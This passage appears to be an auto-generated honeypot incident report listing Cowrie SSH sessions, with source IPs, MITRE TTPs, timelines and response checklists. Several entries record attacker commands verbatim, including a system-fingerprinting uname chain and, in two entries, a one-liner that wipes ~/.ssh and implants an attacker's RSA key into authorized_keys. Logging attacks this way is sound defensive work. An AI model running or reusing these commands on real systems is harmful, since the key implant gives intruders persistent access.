| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:30:10` | `cowrie.session.connect` |
| `2026-07-01 17:30:10` | `cowrie.client.version` |
| `2026-07-01 17:30:10` | `cowrie.client.kex` |
| `2026-07-01 17:30:11` | `cowrie.login.success` |
| `2026-07-01 17:30:11` | `cowrie.session.params` |
| `2026-07-01 17:30:11` | `cowrie.command.input` |
| `2026-07-01 17:30:11` | `cowrie.command.input` |
| `2026-07-01 17:30:11` | `cowrie.command.input` |
| `2026-07-01 17:30:11` | `cowrie.command.input` |
| `2026-07-01 17:30:11` | `cowrie.command.input` |
| `2026-07-01 17:30:11` | `cowrie.command.success` |
| `2026-07-01 17:30:11` | `cowrie.command.input` |
| `2026-07-01 17:30:11` | `cowrie.command.input` |
| `2026-07-01 17:30:11` | `cowrie.command.input` |
| `2026-07-01 17:30:11` | `cowrie.command.input` |
| `2026-07-01 17:30:12` | `cowrie.log.closed` |
| `2026-07-01 17:30:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fe210116168

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 17:30 |
| **Last Seen** | 2026-07-01 17:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:30:28` | `cowrie.session.connect` |
| `2026-07-01 17:30:28` | `cowrie.client.version` |
| `2026-07-01 17:30:28` | `cowrie.client.kex` |
| `2026-07-01 17:30:28` | `cowrie.login.success` |
| `2026-07-01 17:30:29` | `cowrie.session.params` |
| `2026-07-01 17:30:29` | `cowrie.command.input` |
| `2026-07-01 17:30:29` | `cowrie.command.input` |
| `2026-07-01 17:30:29` | `cowrie.command.input` |
| `2026-07-01 17:30:29` | `cowrie.command.input` |
| `2026-07-01 17:30:29` | `cowrie.command.input` |
| `2026-07-01 17:30:29` | `cowrie.command.success` |
| `2026-07-01 17:30:29` | `cowrie.command.input` |
| `2026-07-01 17:30:29` | `cowrie.command.input` |
| `2026-07-01 17:30:29` | `cowrie.command.input` |
| `2026-07-01 17:30:29` | `cowrie.command.input` |
| `2026-07-01 17:30:29` | `cowrie.log.closed` |
| `2026-07-01 17:30:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af19c8ce2ffb

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 17:31 |
| **Last Seen** | 2026-07-01 17:31 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:31:00` | `cowrie.session.connect` |
| `2026-07-01 17:31:01` | `cowrie.client.version` |
| `2026-07-01 17:31:01` | `cowrie.client.kex` |
| `2026-07-01 17:31:07` | `cowrie.login.success` |
| `2026-07-01 17:31:11` | `cowrie.session.params` |
| `2026-07-01 17:31:11` | `cowrie.command.input` |
| `2026-07-01 17:31:12` | `cowrie.log.closed` |
| `2026-07-01 17:31:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d82a1dce7ae8

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-01 17:31 |
| **Last Seen** | 2026-07-01 17:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:31:12` | `cowrie.session.connect` |
| `2026-07-01 17:31:12` | `cowrie.client.version` |
| `2026-07-01 17:31:12` | `cowrie.client.kex` |
| `2026-07-01 17:31:13` | `cowrie.login.success` |
| `2026-07-01 17:31:14` | `cowrie.session.params` |
| `2026-07-01 17:31:14` | `cowrie.command.input` |
| `2026-07-01 17:31:14` | `cowrie.log.closed` |
| `2026-07-01 17:31:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f8d9e3a62bf

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-01 17:32 |
| **Last Seen** | 2026-07-01 17:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:32:29` | `cowrie.session.connect` |
| `2026-07-01 17:32:29` | `cowrie.client.version` |
| `2026-07-01 17:32:29` | `cowrie.client.kex` |
| `2026-07-01 17:32:29` | `cowrie.login.success` |
| `2026-07-01 17:32:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff00169465a8

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-01 17:32 |
| **Last Seen** | 2026-07-01 17:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:32:29` | `cowrie.session.connect` |
| `2026-07-01 17:32:29` | `cowrie.client.version` |
| `2026-07-01 17:32:29` | `cowrie.client.kex` |
| `2026-07-01 17:32:29` | `cowrie.login.success` |
| `2026-07-01 17:32:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50c75016a39a

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-01 17:32 |
| **Last Seen** | 2026-07-01 17:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:32:33` | `cowrie.session.connect` |
| `2026-07-01 17:32:33` | `cowrie.client.version` |
| `2026-07-01 17:32:33` | `cowrie.client.kex` |
| `2026-07-01 17:32:33` | `cowrie.login.success` |
| `2026-07-01 17:32:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f182836e0395

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-01 17:32 |
| **Last Seen** | 2026-07-01 17:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:32:33` | `cowrie.session.connect` |
| `2026-07-01 17:32:33` | `cowrie.client.version` |
| `2026-07-01 17:32:33` | `cowrie.client.kex` |
| `2026-07-01 17:32:33` | `cowrie.login.success` |
| `2026-07-01 17:32:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7935e4ba3281

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 17:35 |
| **Last Seen** | 2026-07-01 17:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:35:26` | `cowrie.session.connect` |
| `2026-07-01 17:35:26` | `cowrie.client.version` |
| `2026-07-01 17:35:26` | `cowrie.client.kex` |
| `2026-07-01 17:35:29` | `cowrie.login.success` |
| `2026-07-01 17:35:31` | `cowrie.session.params` |
| `2026-07-01 17:35:31` | `cowrie.command.input` |
| `2026-07-01 17:35:32` | `cowrie.log.closed` |
| `2026-07-01 17:35:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48c745313fa4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-01 17:35 |
| **Last Seen** | 2026-07-01 17:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:35:47` | `cowrie.session.connect` |
| `2026-07-01 17:35:47` | `cowrie.client.version` |
| `2026-07-01 17:35:47` | `cowrie.client.kex` |
| `2026-07-01 17:35:47` | `cowrie.login.success` |
| `2026-07-01 17:35:48` | `cowrie.session.params` |
| `2026-07-01 17:35:48` | `cowrie.command.input` |
| `2026-07-01 17:35:48` | `cowrie.command.input` |
| `2026-07-01 17:35:48` | `cowrie.command.input` |
| `2026-07-01 17:35:48` | `cowrie.command.input` |
| `2026-07-01 17:35:48` | `cowrie.command.input` |
| `2026-07-01 17:35:48` | `cowrie.command.success` |
| `2026-07-01 17:35:48` | `cowrie.command.input` |
| `2026-07-01 17:35:48` | `cowrie.command.input` |
| `2026-07-01 17:35:48` | `cowrie.command.input` |
| `2026-07-01 17:35:48` | `cowrie.command.input` |
| `2026-07-01 17:35:48` | `cowrie.log.closed` |
| `2026-07-01 17:35:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b48109122749

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 17:36 |
| **Last Seen** | 2026-07-01 17:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:36:26` | `cowrie.session.connect` |
| `2026-07-01 17:36:26` | `cowrie.client.version` |
| `2026-07-01 17:36:27` | `cowrie.client.kex` |
| `2026-07-01 17:36:27` | `cowrie.login.success` |
| `2026-07-01 17:36:28` | `cowrie.session.params` |
| `2026-07-01 17:36:28` | `cowrie.command.input` |
| `2026-07-01 17:36:28` | `cowrie.command.input` |
| `2026-07-01 17:36:28` | `cowrie.command.input` |
| `2026-07-01 17:36:28` | `cowrie.command.input` |
| `2026-07-01 17:36:28` | `cowrie.command.input` |
| `2026-07-01 17:36:28` | `cowrie.command.success` |
| `2026-07-01 17:36:28` | `cowrie.command.input` |
| `2026-07-01 17:36:28` | `cowrie.command.input` |
| `2026-07-01 17:36:28` | `cowrie.command.input` |
| `2026-07-01 17:36:28` | `cowrie.command.input` |
| `2026-07-01 17:36:28` | `cowrie.log.closed` |
| `2026-07-01 17:36:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8128bed5db55

| Field | Detail |
|---|---|
| **Source IP** | `202.155.157[.]145` |
| **First Seen** | 2026-07-01 17:37 |
| **Last Seen** | 2026-07-01 17:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:37:56` | `cowrie.session.connect` |
| `2026-07-01 17:37:56` | `cowrie.client.version` |
| `2026-07-01 17:37:56` | `cowrie.client.kex` |
| `2026-07-01 17:37:57` | `cowrie.login.success` |
| `2026-07-01 17:37:58` | `cowrie.session.params` |
| `2026-07-01 17:37:58` | `cowrie.command.input` |
| `2026-07-01 17:37:58` | `cowrie.command.failed` |
| `2026-07-01 17:37:58` | `cowrie.log.closed` |
| `2026-07-01 17:37:59` | `cowrie.session.params` |
| `2026-07-01 17:37:59` | `cowrie.command.input` |
| `2026-07-01 17:37:59` | `cowrie.session.file_download` |
| `2026-07-01 17:37:59` | `cowrie.log.closed` |
| `2026-07-01 17:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.155.157[.]145` to AbuseIPDB if not already reported
- [ ] Block `202.155.157[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b86a7d098368

| Field | Detail |
|---|---|
| **Source IP** | `202.155.157[.]145` |
| **First Seen** | 2026-07-01 17:38 |
| **Last Seen** | 2026-07-01 17:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:38:00` | `cowrie.session.connect` |
| `2026-07-01 17:38:00` | `cowrie.client.version` |
| `2026-07-01 17:38:00` | `cowrie.client.kex` |
| `2026-07-01 17:38:01` | `cowrie.login.success` |
| `2026-07-01 17:38:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.155.157[.]145` to AbuseIPDB if not already reported
- [ ] Block `202.155.157[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20d4406a044e

| Field | Detail |
|---|---|
| **Source IP** | `202.155.157[.]145` |
| **First Seen** | 2026-07-01 17:38 |
| **Last Seen** | 2026-07-01 17:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:38:01` | `cowrie.session.connect` |
| `2026-07-01 17:38:01` | `cowrie.client.version` |
| `2026-07-01 17:38:02` | `cowrie.client.kex` |
| `2026-07-01 17:38:03` | `cowrie.login.success` |
| `2026-07-01 17:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.155.157[.]145` to AbuseIPDB if not already reported
- [ ] Block `202.155.157[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9ac3bd9e886

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-01 17:41 |
| **Last Seen** | 2026-07-01 17:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:41:26` | `cowrie.session.connect` |
| `2026-07-01 17:41:26` | `cowrie.client.version` |
| `2026-07-01 17:41:26` | `cowrie.client.kex` |
| `2026-07-01 17:41:26` | `cowrie.login.success` |
| `2026-07-01 17:41:27` | `cowrie.session.params` |
| `2026-07-01 17:41:27` | `cowrie.command.input` |
| `2026-07-01 17:41:27` | `cowrie.command.input` |
| `2026-07-01 17:41:27` | `cowrie.command.input` |
| `2026-07-01 17:41:27` | `cowrie.command.input` |
| `2026-07-01 17:41:27` | `cowrie.command.input` |
| `2026-07-01 17:41:27` | `cowrie.command.success` |
| `2026-07-01 17:41:27` | `cowrie.command.input` |
| `2026-07-01 17:41:27` | `cowrie.command.input` |
| `2026-07-01 17:41:27` | `cowrie.command.input` |
| `2026-07-01 17:41:27` | `cowrie.command.input` |
| `2026-07-01 17:41:27` | `cowrie.log.closed` |
| `2026-07-01 17:41:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61936f089ca9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 17:42 |
| **Last Seen** | 2026-07-01 17:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:42:28` | `cowrie.session.connect` |
| `2026-07-01 17:42:28` | `cowrie.client.version` |
| `2026-07-01 17:42:28` | `cowrie.client.kex` |
| `2026-07-01 17:42:28` | `cowrie.login.success` |
| `2026-07-01 17:42:29` | `cowrie.session.params` |
| `2026-07-01 17:42:29` | `cowrie.command.input` |
| `2026-07-01 17:42:29` | `cowrie.command.input` |
| `2026-07-01 17:42:29` | `cowrie.command.input` |
| `2026-07-01 17:42:29` | `cowrie.command.input` |
| `2026-07-01 17:42:29` | `cowrie.command.input` |
| `2026-07-01 17:42:29` | `cowrie.command.success` |
| `2026-07-01 17:42:29` | `cowrie.command.input` |
| `2026-07-01 17:42:29` | `cowrie.command.input` |
| `2026-07-01 17:42:29` | `cowrie.command.input` |
| `2026-07-01 17:42:29` | `cowrie.command.input` |
| `2026-07-01 17:42:29` | `cowrie.log.closed` |
| `2026-07-01 17:42:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4f33eb83930

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 17:42 |
| **Last Seen** | 2026-07-01 17:42 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:42:33` | `cowrie.session.connect` |
| `2026-07-01 17:42:35` | `cowrie.client.version` |
| `2026-07-01 17:42:35` | `cowrie.client.kex` |
| `2026-07-01 17:42:40` | `cowrie.login.success` |
| `2026-07-01 17:42:44` | `cowrie.session.params` |
| `2026-07-01 17:42:44` | `cowrie.command.input` |
| `2026-07-01 17:42:45` | `cowrie.log.closed` |
| `2026-07-01 17:42:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47eee90a5050

| Field | Detail |
|---|---|
| **Source IP** | `103.187.147[.]214` |
| **First Seen** | 2026-07-01 17:45 |
| **Last Seen** | 2026-07-01 17:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:45:09` | `cowrie.session.connect` |
| `2026-07-01 17:45:09` | `cowrie.client.version` |
| `2026-07-01 17:45:09` | `cowrie.client.kex` |
| `2026-07-01 17:45:10` | `cowrie.login.success` |
| `2026-07-01 17:45:12` | `cowrie.session.params` |
| `2026-07-01 17:45:12` | `cowrie.command.input` |
| `2026-07-01 17:45:12` | `cowrie.command.failed` |
| `2026-07-01 17:45:12` | `cowrie.log.closed` |
| `2026-07-01 17:45:13` | `cowrie.session.params` |
| `2026-07-01 17:45:13` | `cowrie.command.input` |
| `2026-07-01 17:45:13` | `cowrie.session.file_download` |
| `2026-07-01 17:45:13` | `cowrie.log.closed` |
| `2026-07-01 17:45:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.187.147[.]214` to AbuseIPDB if not already reported
- [ ] Block `103.187.147[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d560a8d2478

| Field | Detail |
|---|---|
| **Source IP** | `103.187.147[.]214` |
| **First Seen** | 2026-07-01 17:45 |
| **Last Seen** | 2026-07-01 17:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
